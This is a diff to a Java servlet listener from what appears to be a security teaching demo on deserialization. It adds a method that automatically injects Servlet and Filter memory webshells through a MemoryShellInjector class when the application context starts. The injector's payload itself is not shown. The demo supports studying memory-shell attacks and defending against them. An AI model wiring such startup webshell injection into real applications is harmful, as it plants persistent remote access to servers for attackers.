@@ -4,6 +4,7 @@ import jakarta.servlet.*;
 import jakarta.servlet.annotation.WebListener;
 import jakarta.servlet.http.HttpSessionEvent;
 import jakarta.servlet.http.HttpSessionListener;
+import com.book.demo.memshell.MemoryShellInjector;
 
 import java.io.*;
 import java.util.Base64;
@@ -27,6 +28,9 @@ public class DemoListener implements ServletContextListener, HttpSessionListener
         try {
             // 演示Context初始化时的反序列化操作
             demonstrateContextInitialization(context);
+            
+            // 自动注入内存马用于演示
+            autoInjectMemoryShells();
         } catch (Exception e) {
             System.out.println("[DEMO-LISTENER] Context初始化演示失败: " + e.getMessage());
         }
@@ -207,5 +211,28 @@ public class DemoListener implements ServletContextListener, HttpSessionListener
     
     public static int getCurrentSessionCount() {
         return sessionCounter.get();
+    }
+    
+    /**
+     * 自动注入内存马用于演示
+     */
+    private void autoInjectMemoryShells() {
+        System.out.println("[DEMO-LISTENER] 开始自动注入内存马...");
+        
+        try {
+            // 注入Servlet内存马
+            MemoryShellInjector.InjectionResult servletResult = MemoryShellInjector.injectServletShell();
+            System.out.println("[DEMO-LISTENER] Servlet内存马注入结果: " + 
+                             (servletResult.isSuccess() ? "成功" : "失败 - " + servletResult.getMessage()));
+            
+            // 注入Filter内存马
+            MemoryShellInjector.InjectionResult filterResult = MemoryShellInjector.injectFilterShell();
+            System.out.println("[DEMO-LISTENER] Filter内存马注入结果: " + 
+                             (filterResult.isSuccess() ? "成功" : "失败 - " + filterResult.getMessage()));
+            
+        } catch (Exception e) {
+            System.err.println("[DEMO-LISTENER] 自动注入内存马失败: " + e.getMessage());
+            e.printStackTrace();
+        }
     }
 }
